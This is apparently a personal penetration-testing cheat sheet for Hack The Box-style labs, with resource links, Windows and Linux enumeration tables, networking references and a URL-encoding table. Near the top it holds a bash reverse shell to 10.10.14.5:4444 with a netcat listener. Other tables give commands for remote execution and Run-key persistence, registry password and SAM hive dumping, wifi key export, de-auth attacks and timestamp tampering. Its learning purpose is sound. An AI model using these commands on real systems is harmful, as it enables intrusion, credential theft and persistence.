Reminder: Github uses advanced search syntax - press `t`. Or clone locally and grep

`cp /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt .`

# RESOURCES
OWASP Projects
- [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/)
- [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/index.html)
     [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/stable-en/)

HackTricks
- [HackTricks](https://book.hacktricks.wiki/en/index.html)
- [HackTricks Cloud](https://cloud.hacktricks.wiki/en/index.html)

PrivEsc
- [GTFOBins](https://gtfobins.github.io/)
- [Linux PE Checklist](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)
- [Windows PE Checkist](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html)
- https://infosecwriteups.com/hackthebox-academy-privilege-escalation-ca0a8ad2259e

Git
- [GitHub CheatSheet](https://training.github.com/downloads/github-git-cheat-sheet/)

Enumeration
- [Server Enum](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Kernel
- [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

Kindle Books

HTB
- https://academy.hackthebox.com/dashboard
 
# COMMON CODE SNIPPETS
### Clone
`git clone https://github.com/Jacob-CL/Notes.git`

`git commit -m "message"`

`git push`

If you've made edits in GitHub, to merge those down locally: `git pull` (This is `git fetch` and `git merge` in one)

### Python Virtual Environment
```
# Create the virtual environment
python3 -m venv v-env

# Start virtual environment
source v-env/bin/activate

# Stop virtual environment
deactivate
```
### Bash Reverse Shell
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```
### Python HTTP Server
```
# Serves files from current directory, also accessible vias browser
python3 -m http.server 8000
```
### Netcat Listener
```
nc -lvnp 4444
```
### Find all files recursively
```
find . -type f
```

# WINDOWS BASICS
### Windows Administrative Binaries
| Windows Administrative Binaries | |
|----------------------------------|--------------------------------------------------|
| lusrmgr.msc | Local user and group manager |
| services.msc | Services control panel |
| taskmgr.exe | Task manager |
| secpol.msc | Local security policy editor |
| eventvwr.msc | Event viewer |
| regedit.exe | Registry editor |
| gpedit.msc | Group policy editor |
| control.exe | Control panel |
| ncpa.cpl | Network connections manager |
| devmgmt.msc | Device manager editor |
| diskmgmt.msc | Disk manager editor |

---

### Windows Environment Variables
| Environment Variables | |
|----------------------------------|--------------------------------------------------|
| %SYSTEMROOT% | Points to Windows folder (Commonly: C:\Windows) |
| %APPDATA% | Points to user roaming directory Commonly (C:\Users\<USERNAME>\AppData\Roaming) |
| %COMPUTERNAME% | The computer hostname |
| %HOMEDRIVE% | Points to default OS drive (Commonly: C:\) |
| %HOMEPATH% | Points to user directory (Commonly: C:\Users\<USERNAME>) |
| %PATH% | When a command is run without a full path (for example: ipconfig) the OS searches all file paths contained in the PATH environmental variable for this file |
| %PATHEXT% | When a command is run without an extension (for example: ipconfig) the OS searches for file matches that INCLUDE extensions from this PATHEXT list |
| %SYSTEMDRIVE% | Points to default OS drive (Commonly: C:\) |
| %TMP% && %TEMP% | Points to user temp folders (Commonly: C:\Users\<USERNAME>\AppData\Local\Temp) |
| %USERPROFILE% | Points to user directories (Commonly: C:\Users\<USERNAME>) |
| %WINDIR% | Points to Windows directory (Commonly: C:\Windows) |
| %ALLUSERSPROFILE% | Points to Windows directory (Commonly: C:\ProgramData Windows 10+) |

---

### Windows Key Files & Locations
| Windows Key Files & Locations | |
|----------------------------------|--------------------------------------------------|
| %SYSTEMROOT%\System32\drivers\etc\hosts | DNS entries |
| %SYSTEMROOT%\System32\drivers\etc\networks | Network settings |
| %SYSTEMROOT%\System32\config\SAM | User & password hashes |
| %SYSTEMROOT%\repair\SAM | Backup copy of SAM (WinXP) |
| %SYSTEMROOT%\System32\config\RegBack\SAM | Backup copy of SAM |
| %WINDIR%\System32\config\AppEvent.Evt | Application Log (WinXP) |
| %WINDIR%\System32\config\SecEvent.Evt | Security Log    (WinXP) |
| %WINDIR%\System32\config\SECURITY | Security Log |
| %WINDIR%\System32\config\APPLICATION | Application Log |
| %ALLUSERSPROFILE%\Start Menu\Programs\Startup\ | Startup Location (WinXP) |
| %USERPROFILE%\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup | Startup Folder |
| %WINDIR%\Panther\ | Commonly used unattend install files |
| %WINDIR%\System32\Sysprep | Commonly used unattend install files |
| %WINDIR%\kb* | Installed patches (WinXP) |

---

### Windows System Enumeration
| Operating System Information | Description |
|---------|-------------|
| ver | Enumerate Windows version information |
| wmic qfe list | Display hotfixes and service packs |
| wmic cpu get datawidth /format:list | Display whether 32 or 64 bit system |
| dir /a c:\ | Enumerate OS architecture - The existence of Program Files (x86) means machine is 64bit |
| systeminfo | Display OS configuration, including service pack levels |
| fsutil fsinfo drives | Display drives |
| wmic logicaldisk get description,name | Display logical drives |
| set | Display environment variables |
| dir /a c:\pagefile.sys | Date of last reboot - Created date of pagefile.sys is last startup |
| net share | Display shares |
| net session | Display local sessions |
| reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\ | List user mounted shares - MUST BE RUN IN THE CONTEXT OF THE USER |

---

### Windows Process & Service Enumeration
| PROCESS & SERVICE ENUMERATION | |
|----------------------------------|--------------------------------------------------|
| tasklist /svc | Display services hosted in each process |
| tasklist /FI "USERNAME ne NT AUTHORITY\SYSTEM" /FI "STATUS eq running" /V | Display detailed information for running processes that are not running as SYSTEM |
| taskkill /F /IM <PROCESS_NAME> /T | Force all instances of a process and child processes to terminate (terminate specific PID with /PID <PID>) |
| wmic process where name="<PROCESS_NAME>" call terminate | Terminate all instances of a process |
| wmic process get name,executablepath,processid | Display the executable path and PID of all running processes |
| Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop | Display Anti-Virus products commonly registered as AntiVirusProduct (PowerShell command) |
| runas /user :<DOMAIN>\<USERNAME> "<FILE_PATH> [ARGS]" | Run a file as a specific user (prompts for password) |
| tasklist /v \| findstr "<STRING_TO_SEARCH>" | Display processes that match a certain string |
| wmic process get processid,commandline | Display processes (including command line arguments used to launch them) |
| sc query state= all | Display services (space after state=) |

---

### Windows Account Enumeration
| WINDOWS ACCOUNT ENUMERATION | |
|----------------------------------|--------------------------------------------------|
| echo %USERNAME% | Display current user |
| wmic netlogin where (name like "%<USERNAME>%") get Name, numberoflogons" | List number of times user has logged on |
| net localgroup "Administrator" | Display local Administrators |

---

### Windows Network info & Configuration
| NETWORK INFO & CONFIGURATION | |
|----------------------------------|--------------------------------------------------|
| ipconfig /all | Network interface information |
| ipconfig /displaydns | Display local DNS cache |
| netstat -ano | Display all connections and ports with associated process ID |
| netstat -anop tcp 3 >> <FILE_PATH> | Write netstat output to file every 3 seconds |
| netstat -an \| findstr LISTENING | Display only listening ports |
| route print | Display routing table |
| arp -a | Display ARP table |
| nslookup server <FQDN> set type=ANY ls -d <DOMAIN> > <FILEPATH> exit | Attempt DNS zone transfer |
| nslookup -type=SRV *www.* tcp.<URL> | Domain SRV lookup (other options: _ldap, *kerberos, *sip) |
| netsh firewall set opmode disable | Disable firewall (*Old) |
| netsh wlan show profiles | Display saved wireless profiles |
| netsh wlan export profile folder=. key=clear | Export wireless profiles to include plaintext encryption keys |
| netsh interface ip show interfaces | List interface IDs/MTUs |
| netsh interface ip set address name="<INTERFACE_NAME>" static <NEW_IP> <NEW_SUBNET_MASK> <NEW_GATEWAY> | Set IP |
| netsh interface ip set dnsservers name="<INTERFACE_NAME>" static <DNS_SERVER_IP> | Set DNS server |
| netsh interface ip set address name="<INTERFACE_NAME>" source=dhcp | Set interface to use DHCP |

---

### Windows Registry Commands & Important Keys
| REGISTRY COMMANDS & IMPORTANT KEYS | |
|----------------------------------|--------------------------------------------------|
| reg query HKLM /f password /t REG_SZ /s | Search registry for password (Requires SYSTEM privileges) |
| reg save HKLM\Security security.hive | Save security hive to file |
| HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName /v InstallDate /v RegisteredOwner /v SystemRoot | OS information |
| HKLM\System\CurrentControlSet\Control\TimeZonelnformation /v ActiveTimeBias | Time zone (offset in minutes from UTC) |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU | Mapped network drives |
| HKLM\System\MountedDevices | Mounted devices |
| HKLM\System\CurrentControlSet\Enum\USB | USB devices |
| HKLM\Security\Policy\PolAdTev | Audit policy enumeration (Requires SYSTEM privileges) |
| HKLM\SYSTEM\CurrentControlSet\Services | Kernel/user services |
| HKLM\Software | Installed software for all users |
| HKCU\Software | Installed software for current user |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Wordpad\Recent File List | Recent WordPad documents |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU | Recent typed entries in the Run dialog box |
| HKCU\Software\Microsoft\Internet Explorer\TypedURLs | Typed URLs |
| HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit /v LastKey | Last registry key accessed via regedit.exe |

---

### Windows Remote System Enumeration
| REMOTE SYSTEM ENUMERATION | |
|----------------------------------|--------------------------------------------------|
| net session \\<IP_ADDRESS> | Display sessions for remote system |
| wmic /node: <IP_ADDRESS> computersystem get username | Display logged in user on remote machine |
| wmic /node: <IP_ADDRESS> /user:<DOMAIN>\<USERNAME> /password:<PASSWORD> process call create "\\<IP_ADDRESS>\<SHARE_FOLDER>\<FILE_PATH>" | Execute file hosted over SMB on remote system with specified credentials |
| wmic /node: <IP_ADDRESS> process list brief /every:1 | Display process listing every second for remote machine |
| reg query \\<IP_ADDRESS>\<REG_HIVE>\<REG_KEY>/v <REG_VALUE> | Query remote registry |
| tasklist /S <IP_ADDRESS> /v | Display process listing on remote system |
| systeminfo /S <IP_ADDRESS> /U <DOMAIN>\<USERNAME> /P <PASSWORD> | Display system information for remote system |
| net view \<IP_ADDRESS> /all | Display shares of remote computer |
| net use * \\<IP_ADDRESS>\<SHARE FOLDER> /user:<DOMAIN>\<USERNAME> <PASSWORD> | Connect to remote filesystem with specified user account |
| REG ADD "\\<IP_ADDRESS>\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "My App" /t REG_SZ /F /D "<FILE_PATH>" | Add registry key to remote system |
| xcopy /s \\<IP_ADDRESS>\<SHARE_FOLDER> <LOCAL_DIR> | Copy remote folder |
| dir \\<IP_ADDRESS>\c$ | Display system uptime - look for creation date of pagefile.sys. This is the last time the system started |
| tasklist /v /s <IP_ADDRESS> | Display processes (look for AV, logged on users, programs of interest, etc.) |
| dir \\<IP_ADDRESS>\c$ | Display system architecture - Presence of "Program Files (x86)" means 64-bit system |

## Windows Data Mining 

# LINUX BASICS
### Linux Basic Commands
| Basic Commands | Description |
|----------------|-------------|
| ls | List Directory |
| cd | Change Directory |
| mv | Move File |
| man | Manual Pages |
| mkdir | Make Directory |
| rmdir | Remove Directory |
| touch | Make Empty File |
| rm | Remove File |
| locate | Locate File |
| pwd | Print Working Directory |
| cat | Print Contents |
| cp | Copy |
| ln | Link |
| sudo | Super User Do |
| head | Display Header of File |
| tail | Display Tail of File |
| chmod | change permissions |

---

### Linux Administrative Commands
| Administrative Commands | Description |
|-------------------------|-------------|
| curl <url> | get HTML of webpage |
| wget <url> | retrieve file |
| rdesktop <ip> | Remote desktop |
| ssh <ip> | Secure Shell |
| scp <directory> <user>@<ip>:<directory> | Put File |
| scp <user>@<ip>:<directory> <directory> | Get File |
| useradd <username> | Add User |
| passwd <user> | Change User Password |
| rmuser <user> | Remove User |
| script -a <outfile> | Record Shell |
| apropos <topic> | Search Man Pages for Topic |
| history | Show users bash history |
| ! <number> | Executes from number in history |
| env | Environment Variables |
| top | Shows top processes |
| ifconfig | Shows ip address |
| lsof | Files associated with application |

---

### Linux Directories
| Directory | Description |
|:-----------|:-------------|
| / | Anchor and root of the filesystem |
| /bin | User binaries |
| /boot | Boot-up related files |
| /dev | Interface for system devices |
| /etc | System configuration files |
| /home | Base directory for user files |
| /lib | Critical software libraries |
| /opt | Third party software |
| /proc | System and running programs |
| /root | Home directory of root user |
| /sbin | System administrator binaries |
| /tmp | Temporary files |
| /usr | Contains all the system files. Less critical files |
| /var | Variable system files |

---

### Important Linux Files and Directories
| Important Files + Directories | Description |
|:----------------|:-------------|
| /etc/shadow | User account information and password hashes |
| /etc/passwd | User account information |
| /etc/group | Group names |
| /etc/rc.d | Startup services (rc0.d-rc6.d) |
| /etc/init.d | Contains startup/stop scripts |
| /etc/hosts | Hardcoded hostname and IP combinations |
| /etc/hostname | Full hostname with domain |
| /etc/network/interfaces or /etc/netplan | Network configuration |
| /etc/profile | System environment variables |
| /etc/apt/sources.list | Debian package source |
| /etc/resolv.conf | DNS configuration |
| /home/<USER>/.bash_history | User Bash history |
| /usr/share/wireshark/manuf | Vendor-MAC lookup (Kali Linux) |
| ~/.ssh/ | SSH keystore |
| /var/log | System log files (most Linux) |
| /var/adm | System log files (Unix) |
| /var/spool/cron | List cron files |
| /var/log/apache2/access.log | Apache connection log |
| /etc/fstab | Contains local and network configured mounts and shares |

---

### Get Linux OS Information
| Operating System Information | Description |
|:---------|:-------------|
| df -h | Disk usage |
| uname -a | Kernel version & CPU information |
| cat /etc/issue | Display OS information |
| cat /etc/*release* | Display OS version information |
| cat /proc/version | Display kernel information |
| which <SHELL_NAME> | Locate the executable files or location of each shell on the system (Can search: tscsh, csh, ksh, bash, etc.) |
| fdisk -l | Display connected drives |
| host <ip> | get Hostname for IP address |
| who am i | get the Current User |
| w | Show logged in users |
| who -a | | 
| last -a | User login history |
| ps | running processes |
| df | Display free disk space |
| mount | show mounted drives |
| getent passwd | Get entries in passwd(users) |
| PATH=$PATH:/<directory> | Add to the PATH variable |
| kill <pid> | kills process with pid ID |
| kill -9 <pid> | force kill process |
| rpm -i *.rpm | install rpm package |
| rpm -qa | show installed packages |
| dpkg -i *.deb | install deb package |
| dpkg --get-selections | show installed packages/software |
| pkginfo | solaris show installed packages |
| cat /etc/shells | show location of shell executables |
| chmod -x <shell dir> | make shell/file nonexecutable |
| sudo -l | See what sudo perms you have, you might have perms over other users and can then run: `sudo -u user2 /bin/bash /home/user2/flag.txt` if you see you have `/bin/bash/` execution as user2. If another user can use bash but you can't then run all bash commands as that user |
| `sudo -u user2 bash -c 'ls -la'` OR `sudo -u user2 bash -c 'ls -al /root'` | Running bash as another user in SSH shell | 
| sudo su - | Switch to root user | 

---

### Get Linux Situational Awareness
| Situational Awareness & Process Manipulation | Description |
|:---------|:-------------|
| id | Displays current user/group information |
| w | List logged on users and what they are doing |
| who -a | Show currently logged in users |
| last -a | Show past and current login and system boot information |
| ps -ef | Process listing |
| mount or findmnt | List mounted drives |
| kill -9 <PID> | Force kill processes with specific PID |
| killall <PROCESS_NAME> | Kill all processes matching a specific name |
| top | Show all processes sorting by most active |
| cat /etc/fstab | List configured persistent mounts |

Do we have write permissions on cron jobs?
  - /etc/crontab
  - /etc/cron.d
  - /var/spool/cron/crontabs/root


---

### Get Linux account enumeration and config
| User Account Enumeration & Configuration | Description |
|:---------------------------------------|:-----------------------------------------------|
| getent passwd | Display user and service accounts |
| useradd –m <USERNAME> | Add a user |
| usermod -g <GROUPNAME> <USERNAME> | Add user to group |
| passwd <USERNAME> | Change user password |
| usermod --expiredate 1 --lock --shell /bin/nologin <USERNAME> | Lock user account |
| usermod --expiredate 99999 --unlock --shell /bin/bash <USERNAME> | Unlock user account |
| chage –l <USERNAME> | Enumerate user account details |
| userdel <USERNAME> | Delete user |

---

### Get Linux Network config
| Network Configuration | Description |
|:----------------------------------|:--------------------------------------------------|
| watch --interval 3 ss -t --all | List all listening, established, and connected TCP sockets every 3 seconds |
| netstat -tulpn | List all listening TCP and UDP sockets with associated PID/program name |
| lsof –i –u <USERNAME> -a | List all network activity associated to a specific user |
| ifconfig <INTERFACE_NAME> <NEW_IP> netmask <NEW_SUBNET_MASK> or ip addr add <NEW_IP> dev <INTERFACE_NAME> | Set IP and NETMASK |
| ifconfig <INTERFACE_NAME>:<NEW_INTERFACE_NAME> <NEW_IP> or ip addr add <NEW_IP>/<CIDR> dev <INTERFACE_NAME> | Add second IP to existing interface |
| route add default gw <IP_ADDRESS> <INTERFACE_NAME> or ip route add <IP_ADDRESS>/<CIDR> via <GATEWAY_IP> dev <INTERFACE_NAME> | Set gateway |
| ifconfig <INTERFACE_NAME> mtu <SIZE> or ip link set dev <INTERFACE_NAME> mtu <SIZE> | Change MTU size |
| ifconfig <INTERFACE_NAME> hw ether <MAC_ADDRESS> or ip link set dev <INTERFACE_NAME> down ip link set dev <INTERFACE_NAME> address <MAC_ADDRESS> ip link set dev <INTERFACE_NAME> up | Change MAC address |
| iwlist <INTERFACE_NAME> scan | Built-in Wi-Fi Scanner |
| cat /var/log/messages \| grep DHCP | List DHCP assignments |
| tcpkill host <IP_ADDRESS> and port <PORT> | Kills TCP connections running over specific port number |
| echo "1" > /proc/sys/net/ipv4/ip_forward | Enable on IP Forwarding |
| echo "nameserver <IP_ADDRESS>" >> /etc/resolv.conf | Add DNS server |

---

### Linux file manipulation
| File Manipulation | Description |
|:----------------------------------|:--------------------------------------------------|
| diff <FILE_PATH_A> <FILE_PATH_B> | Compare files |
| rm –rf <FILE_PATH> | Force recursive deletion of directory |
| shred –f –u <FILE_PATH> | Secure file deletion |
| touch –r <ORIGINAL_FILE_PATH> <MOD_FILE_PATH> | Modify timestamp to match another file |
| touch –t <YYYYMMDDHHMM> <FILE> | Modify file timestamp |
| grep –c "<STRING>" <FILE_PATH> | Count lines containing specific string |
| awk 'sub("$", "\r")' <SOURCE_FILE_PATH> > <OUTPUT_FILE_PATH> | Convert Linux formatted file to Windows compatible text file |
| dos2unix <FILE_PATH> | Convert Windows formatted file to Linux compatible text file |
| find . –type f -name "*.<FILE_EXTENSION>" | Search current and all subdirectories for all files that end with a specific extension |
| grep -Ria "<SEARCH_PHRASE>" | Search all files (binary and regular files) in current and all subdirectories for a case insensitive phrase |
| wc -l <FILE_PATH> | Return the line count of a target file |
| find / -perm -4000 -exec ls -ld {} \; | Search for setuid files |
| file <FILE_PATH> | Determine file type |
| chattr +i <FILE_PATH> | Set immutable file |
| chattr –i <FILE_PATH> | Unset immutable file |
| dd if=/dev/urandom of=<OUTPUT_FILE_PATH> bs=3145728 count=100 | Generate random file (example 3M file) |

---

### Linux File Hashing
| File Hashing | Description |
|:----------------------------------|:--------------------------------------------------|
| md5sum <FILE_PATH> | Generate MD5 hash of a file |
| echo "<STRING>" \| md5sum | Generate MD5 hash of a string |
| sha1sum <FILE_PATH> | Generate SHA1 hash of a file |

---
### Linux Service Manipulation
| Service Manipulation | Description |
|----------------------------------|--------------------------------------------------|
| systemctl list-unit-files --type=service | List existing services and run status |
| systemctl list-unit-files --type=service \| grep httpd | Check single service status |
| service --status-all | List all services [+] Service is running [-] Service is not running |
| service <SERVICE_NAME> start | Start a service |
| service <SERVICE_NAME> stop | Stop a service |
| service <SERVICE_NAME> status | Check status of a service |
| systemctl disable <SERVICE_NAME> | Disable service so it will not auto start |
| systemctl enable <SERVICE_NAME> | Enable service so it will auto start on reboot |

---

### Linux Wi-Fi Commands
| Linux Wi-Fi Commands | |
|----------------------------------|--------------------------------------------------|
| iwconfig | Display wireless interface configuration |
| rfkill list | List current state of wireless devices |
| rfkill unblock all | Turn on wireless interface |
| airodump –ng <INTERFACE_NAME> | Monitor all interfaces |
| iwconfig ath0 essid <BSSID> ifconfig ath0 up dhclient ath0 | Connect to unsecured Wi-Fi |
| iwconfig ath0 essid <BSSID> key <WEB_KEY> ifconfig ath0 up dhclient ath0 | Connect to WEP Wi-Fi network |
| iwconfig ath0 essid <BSSID> ifconfig ath0 up wpa_supplicant –B –i ath0 –c wpa-psk.conf dhclient ath0 | Connect to WPA-PSK Wi-Fi network |

---

### Linux Wi-Fi Testing
| Linux Wi-Fi Testing | Description |
|----------------------------------|--------------------------------------------------|
| airmon-ng stop <INTERFACE_NAME> | Stop monitor mode interface |
| airmon-ng start <INTERFACE_NAME> iwconfig <INTERFACE_NAME> channel <CHANNEL> | Start monitor mode interface |
| airodump-ng –c <CHANNEL> --bssid <BSSID> –w file <OUTPUT_PATH> | Capture traffic |
| aireplay-ng -0 10 –a <BSSID> –c <VICTIM_MAC> <INTERFACE_NAME> | Force client de-auth |
| #WPA-PSK aircrack-ng –w <WORDLIST_PATH> <CAPTURED_HANDSHAKE_FILE_PATH> | Brute force handshake |
| #EAP-MD5 eapmd5pass –r <CAPTURED_HANDSHAKE_FILE_PATH> –w <WORDLIST_PATH> | Brute force handshake |

---

### Linux Bluetrooth Commands
| Linux Bluetooth | |
|----------------------------------|--------------------------------------------------|
| hciconfig <INTERFACE_NAME> up | Turn on Bluetooth interface |
| hcitool –i <INTERFACE_NAME> scan --flush –all | Scan for Bluetooth devices |
| sdptool browse <INTERFACE_NAME> | List open services |
| hciconfig <INTERFACE_NAME> name "<BLUETOOTH_NAME>" class 0x520204   piscan | Set as discoverable |
| pand –K | Clear pand sessions |

---

# NETWORKING
## IPv4
### Classful IPv4 Ranges
| Classful IPv4 Ranges | Description |
|----------------------------------|--------------------------------------------------|
| 0.0.0.0   – 127.255.255.255 | Class A Range |
| 128.0.0.0 – 191.255.255.255 | Class B Range |
| 192.0.0.0 – 223.255.255.255 | Class C Range |
| 224.0.0.0 – 239.255.255.255 | Class D Range |
| 240.0.0.0 – 255.255.255.255 | Class E Range |

---

### Reserved Private Ranges
| Reserved Private Ranges | Description |
|----------------------------------|--------------------------------------------------|
| 10.0.0.0    – 10.255.255.255 | Class A Range |
| 172.16.0.0  – 172.31.255.255 | Class B Range |
| 192.168.0.0 - 192.168.255.255 | Class C Range |
| 127.0.0.0   – 127.255.255.255 | Loopback Range |

---

### Subnetting
| Subnetting | | |
|-----------|-------------------|-------------|
| /31 | 255.255.255.254 | 0 Useable Hosts |
| /30 | 255.255.255.252 | 2 Hosts |
| /29 | 255.255.255.248 | 6 Hosts |
| /28 | 255.255.255.240 | 14 Hosts |
| /27 | 255.255.255.224 | 30 Hosts |
| /26 | 255.255.255.192 | 62 Hosts |
| /25 | 255.255.255.128 | 126 Hosts |
| /24 | 255.255.255.0 | 254 Hosts |
| /23 | 255.255.254.0 | 510 Hosts |
| /22 | 255.255.252.0 | 1022 Hosts |
| /21 | 255.255.248.0 | 2046 Hosts |
| /20 | 255.255.240.0 | 4094 Hosts |
| /19 | 255.255.224.

---

## IPv6
### IPv6 Broadcast Addresses
| Broadcast Addresses | |
|----------------------------------|--------------------------------------------------|
| ff02::1 | link-local nodes |
| ff01::2 | node-local routers |
| ff02::2 | link-local routers |
| ff05::2 | site-local routers |

---

### IPv6 Interface Addresses
| Interface Addresses | |
|----------------------------------|--------------------------------------------------|
| fe80:: | link-local |
| 2001:: | routable |
| ::a.b.c.d | IPv4 compatible IPv6 (Example: ::192.168.1.2) |
| ::ffff:a.b.c.d | IPv4 mapped IPv6 (Example: ::FFFF:129.144.52.38) |
| 2000::/3 | Global Unicast |
| FC00::/7 | Unique Local |

---

# CONVERSIONS
## URL Encoding
| **Character** | URL Encoded | **Character** | URL Encoded | **Character** | URL Encoded |
|-----------|------------|-----------|------------|-----------|------------|
| a | %61 | A | %41 | 0 | %30 |
| b | %62 | B | %42 | 1 | %31 |
| c | %63 | C | %43 | 2 | %32 |
| d | %64 | D | %44 | 3 | %33 |
| e | %65 | E | %45 | 4 | %34 |
| f | %66 | F | %46 | 5 | %35 |
| g | %67 | G | %47 | 6 | %36 |
| h | %68 | H | %48 | 7 | %37 |
| i | %69 | I | %49 | 8 | %38 |
| j | %6A | J | %4A | 9 | %39 |
| k | %6B | K | %4B | space | %20 |
| l | %6C | L | %4C | ! | %21 |
| m | %6D | M | %4D | " | %22 |
| n | %6E | N | %4E | # | %23 |
| o | %6F | O | %4F | $ | %24 |
| p | %70 | P | %50 | % | %25 |
| q | %71 | Q | %51 | & | %26 |
| r | %72 | R | %52 | ' | %27 |
| s | %73 | S | %53 | ( | %28 |
| t | %74 | T | %54 | ) | %29 |
| u | %75 | U | %55 | * | %2A |
| v | %76 | V | %56 | + | %2B |
| w | %77 | W | %57 | , | %2C |
| x | %78 | X | %58 | - | %2D |
| y | %79 | Y | %59 | . | %2E |
| z | %7A | Z | %5A | / | %2F |
| : | %3A | ; | %3B | < | %3C |
| = | %3D | > | %3E | ? | %3F |
| @ | %40 | [ | %5B | \ | %5C |
| ] | %5D | ^ | %5E | _ | %5F |
| ` | %60 | { | %7B | \| | %7C |
| } | %7D | ~ | %7E | & | %26 |
| = | %3D | + | %2B | $ | %24 |
| , | %2C | / | %2F | : | %3A |
| ; | %3B | @ | %40 | ? | %3F |
| # | %23 | % | %25 | \\ | %5C |
| -  | %2D | _ | %5F | . | %2E |

